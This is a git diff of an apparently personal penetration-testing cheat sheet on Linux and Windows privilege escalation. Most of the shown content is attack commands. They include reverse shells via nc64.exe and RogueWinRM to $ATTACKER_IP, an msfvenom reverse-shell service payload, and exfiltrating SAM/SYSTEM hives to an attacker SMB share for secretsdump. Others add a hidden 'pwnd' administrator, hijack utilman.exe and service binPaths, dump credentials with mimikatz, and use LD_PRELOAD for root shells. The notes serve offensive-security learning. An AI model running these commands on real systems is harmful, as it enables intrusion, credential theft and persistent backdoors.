@@ -2,11 +2,7 @@
 title: "Privilege Escalation"
 ---
 
-<p style="text-align: right">_- last update 09/08/2022 -_</p>
-
-## Tools
-
-* [AutoSUID](https://github.com/IvanGlinkin/AutoSUID): automate harvesting the SUID executable files and to find a way for further escalating the privileges.
+<p style="text-align: right">_- last update 18/01/2023 -_</p>
 
 ## On linux
 
@@ -49,85 +45,65 @@ There are 3 great script to automate privesc enumerations (test in this order):
 
 #### Manual
 
-Look at the current user and it's rights : `id`
+* `history` : the current shell's history
+* `id` : look at the current user and it's rights
+* `sudo -l` : look for the sudo rights, maybe a command can be abused
+* `uname -a` : detailed system informations (arch, kernel version, distrib, ...)
+* `cat /proc/version` : like uname but better
+* `cat /etc/issue` : 100% gives the distribution name and version
+* `ps -A` : show all processes
+* `ps axjf` :  show all processes as tree
+* `ps aux` : show processes users
+* `env` : show current environment variables
+* `cat /etc/passwd` : list all users
+* `ifconfig || ip a` : network interfaces of the host
+* `[ss|netstat] -a[t|u]` : show all connections (tcp or udp)
+* `[ss|netstat] -l[t|u]` : show listening (tcp or udp)
+* `[ss|netstat] -s[t|u]` : show stats for each protocol
+* `[ss|netstat] -tp` : list connections
+* `[ss|netstat] -i` : show interface statistics
+* `[ss|netstat] -ano` : display All sockets do Not resolve names and display timers (o)
+* `stat /.dockerenv` : if true, you are in a container
 
-Look for the sudo rights, maybe a command can be abused : `sudo -l`
-
-Search for a `/.dockerenv` file to know if you are in a container.
+Useful finds:
 
 ```bash
-hostname
-uname -a
-cat /proc/version # like uname but better
-cat /etc/issue
-ps -A
-ps axjf # show processes as tree
-ps aux # show processes's users
-env
-sudo -l
-id
-cat /etc/passwd
-history
-ifconfig || ip a
-netstat -a[t|u] # show all connections (tcp or udp)
-netstat -l[t|u] # show listening (tcp or udp)
-netstat -s[t|u] # show stats for each protocol
-netstat -tp # list connections
-netstat -i # show interface statistics
-netstat -ano # display All sockets do Not resolve names and display timers (o)
-
-find / -type d -name config
-find / -type f -perm 0777
-find / -perm a=x
-find /home -user $USER
-find / -mtime 10 # find files that were modified in the last 10 days
-find / -atime 10 # find files that were accessed in the last 10 day
-find / -cmin -60 # find files changed within the last hour (60 minutes)
-find / -amin -60 # find files accesses within the last hour (60 minutes)
-find / -size 50M # find files with a 50 MB size
-find / -writable -type d 2>/dev/null  # Find world-writeable folders
-find / -perm -222 -type d 2>/dev/null # Find world-writeable folders
-find / -perm -o w -type d 2>/dev/null # Find world-writeable folders
-find / -perm -o x -type d 2>/dev/null # Find world-executable folders
-find / -name perl*
-find / -name python*
-find / -name gcc*
-find / -perm -u=s -type f 2>/dev/null # Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
-
-stat /.dockerenv
+find / -type d -name config           # config directories
+find / -type f -perm 0777             # ...
+find / -perm a=x                      # files that are executable by everyone
+find /home -user $USER                # files that belongs to $USER
+find / -mtime 10                      # files that were modified in the last 10 days
+find / -atime 10                      # files that were accessed in the last 10 day
+find / -cmin -60                      # files changed within the last hour (60 minutes)
+find / -amin -60                      # files accesses within the last hour (60 minutes)
+find / -size 50M                      # files with a 50 MB size
+find / -writable -type d 2>/dev/null  # world-writeable folders
+find / -perm -222 -type d 2>/dev/null # world-writeable folders
+find / -perm -o w -type d 2>/dev/null # world-writeable folders
+find / -perm -o x -type d 2>/dev/null # world-executable folders
+find / -name *.py                     # python files
+find / -perm -u=s -type f 2>/dev/null # files with the SUID bit set
 ```
 
 ### Kernel Exploits
 
 Use [linux exploit suggester script](https://github.com/jondonas/linux-exploit-suggester-2) which proposes kernel exploit to privesc.
-WARNING: this should be a last resort, they often are very unstable.
+
+**WARNING:** this should be a last resort, they often are very unstable.
 
 ### SUID
-
-The [AutoSUID](https://github.com/IvanGlinkin/AutoSUID) tool is automating the following process.
 
 The following oneliner is listing every file with SGID or SUID flag enabled, ignoring errors and outputing resutis in a file.
 
 ```bash
-# version simple
-find / -perm -u=s -type f 2>/dev/null
-
-# version un peu plus compliquée
 find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt
+
+find / -perm -u=s -o -perm -g=s -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt
 ```
 
-Command details
+Then look for the binaries in [GTFOBins (capabilities)](https://gtfobins.github.io/#+capabilities)
 
-```txt
-find \                # lister tout les fichiers
-  / \                 # depuis la racine
-  -perm -4000 \       # qui ont le bit SUID d'activer
-  -o \                # OU (-or)
-  -perm -2000 \       # le bit SGID d'activé
-  -exec ls -ldb {} \; # pour chaque fichier, afficher en uilisant la commande ls
-```
-
-Once you have this binary list, you can search for a way to escalate privileges from [GTFOBins](https://gtfobins.github.io/) website.
+([AutoSUID](https://github.com/IvanGlinkin/AutoSUID) is automating this process)
 
 ### Capabilities
 
@@ -291,7 +267,7 @@ Break with john (find format in [hashcat examples](https://hashcat.net/wiki/doku
 john --wordlist=rockyou.txt hashes.txt
 ```
 
-( _WARNING: the `=` character is mandatory in arguments !!!_ )
+( _WARNING: the `=` character is mandatory in john's arguments !!!_ )
 
 ### Writable shadow file
 
@@ -301,7 +277,7 @@ If `/etc/shadow` is writable, you can change a user's password.
 mkpasswd -m sha-512 $PASSWORD
 ```
 
-### Missing GTFOBins
+### SUID Apache2
 
 If Apache2 can run as root, we can read the first line of any file. For exemple,
 outputing the root hash of shadow file.
@@ -310,7 +286,7 @@ outputing the root hash of shadow file.
 sudo apache2 -f /etc/shadow
 ```
 
-### Exploiting sudo's LD_PRELOAD inheritance
+### Sudo's LD_PRELOAD inheritance
 
 Verify that sudo inherit the `LD_PRELOAD` variable
 
@@ -346,7 +322,7 @@ sudo LD_PRELOAD=/tmp/preload.so $SUDOABLEPROGRAM
 
 This should give you instantly a root shell.
 
-### Exploiting sudo's LD_LIBRARY_PATH inheritance
+### Sudo's LD_LIBRARY_PATH inheritance
 
 Verify that sudo inherit the `LD_LIBRARY_PATH` variable
 
@@ -432,8 +408,17 @@ The command that will be run:
 tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
 ```
 
-
 ## On Windows
+
+### Ressources (tocheck)
+
+* [PayloadAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+* [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
+* [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
+* [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+* [Decoder's Blog](https://decoder.cloud/)
+* [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+* [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
 
 ### Basics
 
@@ -447,6 +432,87 @@ But there are 3 "hidden" built-in accounts that are important:
 * `SYSTEM / LocalSystem`: which is more powerfull than a common administrator
 * `Local Service`: run Windows services
 * `Network Service`: run Windows services, use computer credentials to authenticate through the network
+
+**WARNING :** on powershell, commands should always be exe if not aliases (for exemple `sc.exe` instead of `sc`)
+
+Usefull: the following command is creating a `pwnd` user with a sample password and adding it to administrators.
+
+```cmd
+net user pwnd SamplePass123 /add & net localgroup administrators pwnd /add
+```
+
+### Stored Credentials
+
+**SAM (Security Accounts Manager)**: It's a system database that store authentication related data (mdp, hash, ...).
+
+There are 2 types of hash to autenticate users:
+
+* **LM (LAN Manager)**: old, vulnerable to full brute-force
+* **NTLMv1 (NT LAN Manager)**: modern, vulnerable to pass the hash and dictionnary attacks
+* **NTLMv2 (NT LAN Manager)**: modern, robust
+
+**LSASS (Local Security Authority Subsystem Service)**: process that talks to the **SAM** to compare hashes / get mdps.
+
+**LSASS** temporary store passwords in plaintext. To allow kind of an SSO.
+
+You can use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump **SAM**'s hashes and break them with [John the Ripper](https://www.openwall.com/john/) !
+
+### Automated enumeration
+
+#### WinPEAS
+
+[LINK](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+Send the long output to a file:
+
+```cmd
+winpeas.exe > outputfile.txt
+```
+
+#### PrivescCheck
+
+[LINK](https://github.com/itm4n/PrivescCheck)
+
+Bypass execution policy
+
+```cmd
+Set-ExecutionPolicy Bypass -Scope process -Force
+```
+
+Run the ps1 file
+
+```cmd
+. .\PrivescCheck.ps1
+Invoke-PrivescCheck
+```
+
+#### WES-NG
+
+[LINK](https://github.com/bitsadmin/wesng)
+
+Store the output of `systeminfo` on the target host
+
+```cmd
+systeminfo > systeminfo.txt
+```
+
+Update the tool's database
+
+```cmd
+wes.py --update
+```
+
+Run the exploit suggester (locally)
+
+```cmd
+wes.py systeminfo.txt
+```
+
+#### Metasploit
+
+```bash
+use multi/recon/local_exploit_suggester
+```
 
 ### Common Enumeration
 
@@ -470,22 +536,6 @@ List services:
 wmic service list
 ```
 
-### Stored Credentials
-
-**SAM (Security Accounts Manager)**: It's a system database that store authentication related data (mdp, hash, ...).
-
-There are 2 types of hash to autenticate users:
-
-* **LM (LAN Manager)**: old, vulnerable to full brute-force
-* **NTLMv1 (NT LAN Manager)**: modern, vulnerable to pass the hash and dictionnary attacks
-* **NTLMv2 (NT LAN Manager)**: modern, robust
-
-**LSASS (Local Security Authority Subsystem Service)**: process that talks to the **SAM** to compare hashes / get mdps.
-
-**LSASS** temporary store passwords in plaintext. To allow kind of an SSO.
-
-You can use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump **SAM**'s hashes and break them with [John the Ripper](https://www.openwall.com/john/) !
-
 ### Common files
 
 #### Unattended Windows Installations
@@ -500,8 +550,11 @@ Administrators may use Windows Deployment Services to create "unattended install
 
 #### Powershell History
 
-```powershell
+```bash
+# cmd
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+# powershell
 type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
@@ -544,29 +597,11 @@ PuTTY
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
-_Incomming (applications storage, configuration files, ...)_
-
 ### Windows Kernel Exploits
 
 _Incomming ..._
 
-### Insecure File/Folder Permissions
-
-_Incomming ..._
-
-### Insecure Service Permissions
-
-_Incomming ..._
-
 ### DLL Hijacking
-
-_Incomming ..._
-
-### Unquoted Service Path
-
-Il est assez courant de pouvoir remplacer des exe ou d'habuser de chemins
-windows. Par exemple voir si on peut renommer des exe qui sont executés
-periodiquement par **WindowsScheduler**.
 
 _Incomming ..._
 
@@ -593,7 +628,7 @@ Install the malicious msi
 msiexec /quiet /qn /i C:\path\to\malicious.msi
 ```
 
-The InstallerFileTakeOver vulnerability:
+The InstallerFileTakeOver vulnerability has automated exploits too:
 
 * [original github (down)](https://github.com/klinix5/InstallerFileTakeOver)
 * [from internet archive](https://archive.org/details/github.com-klinix5-InstallerFileTakeOver_-_2021-11-25_01-39-13)
@@ -603,7 +638,17 @@ The InstallerFileTakeOver vulnerability:
 
 ### Vulnerable privileged Software
 
-_Incomming ..._
+List install softaware with
+
+```cmd
+wmic.exe product get name,version,vendor
+```
+
+However, this is slow and may not return all installed programs. It is always
+worth checking desktop shortcuts, available services or generally any trace that
+indicates the existence of additional software that might be vulnerable.
+
+Then search the software and version on [exploitdb](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/), [google](google.com).
 
 
 ### Scheduled Tasks
@@ -626,46 +671,142 @@ Override with a reverse shell
 echo 'c:\path\to\nc64.exe -e cmd.exe $ATTACKER_IP $ATTACKER_PORT' > c:\path\to\the\task\file.bat
 ```
 
+### Weak system privileges
 
-### Insecure Permissions on Service Executable
+Check privileges
+
+```cmd
+whoami /priv
+```
+
+To understand it: 
+
+* [documentation of all privileges from microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
+* [list of useful privileges for privilege escalation](https://github.com/gtworek/Priv2Admin)
+
+#### SeBackup / SeRestore
+
+Extract system and sam register hives
+
+```cmd
+reg save hklm\system C:\path\to\system.hive
+reg save hklm\sam C:\path\to\sam.hive
+```
+
+Start an smbserver on attacker's host
+
+```bash
+mkdir $MOUNTPOINT
+sudo smbserver.py -smb2support -username $TARGET_USERNAME -password $TARGET_PASSWORD public $MOUNTPOINT
+```
+
+Copy the files to attacker's smb
+
+```cmd
+copy C:\path\to\sam.hive \\$ATTACKER_IP\public\
+copy C:\path\to\system.hive \\$ATTACKER_IP\public\
+```
+
+Dump secrets from the hives 
+
+```bash
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+#### SeTakeOwnership
+
+Here is an exemple with `utilman.exe` but works with anything.
+(`Utilman.exe` is useful because it is a living of the land technique)
+
+Take ownership on the utilman binary
+
+```cmd
+takeown.exe /f c:\windows\system32\utilman.exe
+```
+
+Grant yourself full privileges over this file
+
+```cmd
+icacls.exe c:\windows\system32\utilman.exe /grant $USERNAME
+```
+
+Go on the lock screen (start > user avatar > lock) and click on "Ease of Access"
+button, a SYSTEM shell appear.
+
+#### SeImpersonate / SeAssignPrimaryToken
+
+Use the tool [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) to create a reverse shell:
+
+```cmd
+c:\path\to\RogueWinRM.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe $ATTACKER_IP $ATTACKER_PORT"
+```
+
+### Services
+
+Generate a backdoor service
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp lhost=$ATTACKER_IP lport=$ATTACKER_PORT -f exe-service -o malicious.exe
+```
+
+#### Insecure Service Permissions
+
+Use the [Accesschk sysinternal](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to check for the service DACL:
+
+```cmd
+accesschk64.exe -qlc VulnService
+```
+
+Grant permission to everyone to execute the payload
+
+```cmd
+icacls C:\path\to\malicious.exe /grant Everyone:F
+```
+
+Change the bin path in the service's config
+
+```cmd
+sc.exe config VulnService binPath= "C:\path\to\malicious.exe" obj= LocalSystem
+```
+
+#### Insecure Permissions on Service Executable
 
 Look at the service executable path
 
-```bash
+```cmd
 sc qc VulnerableService
 ```
 
 Check if you can modify the bin
 
-```bash
+```cmd
 icacls c:\path\to\vulnerable.exe
 ```
 
 Override the bin with a reverse shell
 
-```bash
+```cmd
 move malicious.exe c:\path\to\vulnarble.exe
 ```
 
 Restart if you can or wait for someone to restart it
 
-```bash
+```cmd
 sc stop VulnerableService
 sc start VulnerableService
 ```
 
-
-### Unquoted Service Paths
+#### Unquoted Service Paths
 
 Look at the service executable path
 
-```bash
+```cmd
 sc qc VulnerableService
 ```
 
 If the path has spaces, you can inject malicious exe in PATH
 
-```bash
+```cmd
 C:\my program\path\has\spaces.exe # service binary
 C:\my.exe                         # malicious binary
 ```
